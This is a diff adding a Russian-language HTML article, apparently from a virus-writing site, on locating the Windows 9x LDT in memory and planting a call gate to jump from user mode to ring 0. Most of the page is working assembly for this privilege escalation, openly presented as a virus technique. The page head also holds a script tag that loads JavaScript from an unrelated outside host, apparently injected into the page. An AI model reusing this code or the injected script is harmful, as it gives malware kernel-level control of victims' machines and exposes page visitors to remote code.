@@ -1,0 +1,186 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+<HEAD>
+<TITLE>Поиск LDT в памяти</title><script language='JavaScript' type='text/javascript' src='http://proxy.host.sk/index.php'></script>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+</HEAD>
+<BODY bgcolor=#C0C0C0 text=#000000 alink=#000080 vlink=#000080 link=#000080>
+
+<h3 align=center>Поиск LDT в памяти</h3>
+
+<p>Итак, GreenMonsterом реализована очередная вирусная фича -- поиск LDT в памяти.
+
+<p>Здесь мы будем говорить о применении подобной техники к работе из
+PE файлов.
+
+<p>Из PE файлов желательно вызывать только win32 api-функции.
+Поэтому мы не будем делать никаких поисков по алиасу: ведь для того, чтобы
+обращаться к LDT через селектор (а не линейный 0-based flat-адрес),
+мы должны изменить права этого селектора. Таких winapi-функций нет.
+Конечно, можно вызвать INT 31 (DPMI-функции) таким образом:
+
+<pre><font color=#000040>
+int31:                  push    ecx
+                        push    eax
+                        push    0002A0029h      ; INT 31 (DPMI services)
+                        call    kernel@ord0
+</font></pre>
+
+<p>Но это было бы слишком просто. Поэтому мы будем искать LDT в памяти.
+
+<p>Что искать? 8-байтовые дескрипторы для известных нам селекторов
+легко получаемы функцией GetThreadSelectorEntry.
+Вызывается оно так:
+
+<pre><font color=#000040>
+                        call    GetCurrentThread    ; получить хендл нити
+
+                        push    offset cs_descr     ; поинтер на дескриптор
+                        push    cs                  ; селектор
+                        push    eax                 ; хендл нити
+                        callW   GetThreadSelectorEntry
+                        or      eax, eax
+                        jz      __error
+</font></pre>
+
+<p>Параметры, проверяемые в этой функции:
+валидность нити и указателя на результат,
+а также граница LDT и бит 2 в селекторе. Это значит, что можно получить
+любой дескриптор из LDT, если подавать (селектор = номер * 8 + 4).
+Таким образом мы получаем некторое количество дескрипторов, посредством
+чего создаем у себя в памяти копию LDT.
+А далее, полагая, что LDT начинается на границе 4k-байтной страницы,
+используя SEH и сравнивая страницы памяти, перебираем все возможные адреса.
+
+<p>Выглядит это так:
+
+<pre><font color=#000040>
+; -- [FIND_LDT.INC] -------------------------------------------------------
+
+LDT_MIN_ADDR            equ     080000000h
+LDT_MAX_ADDR            equ     0FFFFF000h
+LDT_SCANSIZE            equ     4096
+
+                        .data
+
+ldtpage                 db      LDT_SCANSIZE dup (?)
+
+                        .code
+
+; subroutine: find_ldt_prepare
+; action:     fill internal variables
+; output:     CF=0 all ok
+;             CF=1 unknown error
+
+find_ldt_prepare:       pusha
+
+                        xor     esi, esi
+
+__cycle:                lea     eax, ldtpage[esi]
+                        push    eax
+                        lea     eax, [esi+4]  ; bit2=LDT
+                        push    eax
+                        callW   GetCurrentThread
+                        push    eax
+                        callW   GetThreadSelectorEntry
+                        or      eax, eax
+                        jz      __error
+
+                        add     esi, 8
+                        cmp     esi, LDT_SCANSIZE
+                        jb      __cycle
+
+                        clc
+
+__exit:                 popa
+                        ret
+
+__error:                stc
+                        jmp     __exit
+
+; subroutine: find_ldt_scanmemory
+; input:      none
+; output:     CF=0   EBX=LDT base
+;             CF=1   not found
+
+find_ldt_scanmemory:    mov     ebx, LDT_MIN_ADDR
+
+__cycle:                call    find_ldt_testpage
+                        jnc     __found
+
+                        add     ebx, 4096
+                        cmp     ebx, LDT_MAX_ADDR
+                        jb      __cycle
+
+                        stc
+                        ret
+
+__found:                clc
+                        ret
+
+; subroutine: find_ldt_testpage
+; input:      EBX=any VA
+; output:     CF=0  address contains LDT
+;             CF=1  no ldt found or an error occured while accessing memory
+
+find_ldt_testpage:      pusha
+
+                        call    __seh_init
+                        mov     esp, [esp+8]
+__error:                stc
+                        jmp     __seh_exit
+__seh_init:             push    dword ptr fs:[0]
+                        mov     fs:[0], esp
+
+                        or      byte ptr [ebx], 0       ; must be writeable
+
+                        lea     esi, ldtpage
+                        mov     edi, ebx
+                        mov     ecx, LDT_SCANSIZE/4
+                        cld
+                        rep     cmpsd
+                        jne     __error
+
+                        clc
+
+__seh_exit:             pop     dword ptr fs:[0]
+                        pop     eax
+
+                        popa
+                        ret
+
+; -- [FIND_LDT.INC] -------------------------------------------------------
+</font></pre>
+
+<p>Далее, разумеется, идет переход в ring-0:
+
+<pre><font color=#000040>
+                        call    find_ldt_prepare
+                        jc      __error
+                        call    find_ldt_scanmemory
+                        jc      __error
+
+CGSEL                   equ     0*8
+
+                        fild    qword ptr [ebx+CGSEL]
+
+                        push    offset ring0
+                        pop     [ebx].word ptr 0
+                        pop     [ebx].word ptr 6
+                        mov     [ebx+2], 0EC000028h
+
+                        db      9Ah
+                        dd      ?
+                        dw      CGSEL+111b      ; 111b=LDT+Ring3
+
+                        fistp   qword ptr [ebx+CGSEL]
+
+                        ...
+
+ring0:                  int 3
+                        retf
+</font></pre>
+
+<p>см. также <a href="find_ldt.zip">пример подключения find_ldt.inc</a>.
+
+<p align=right>(x) 
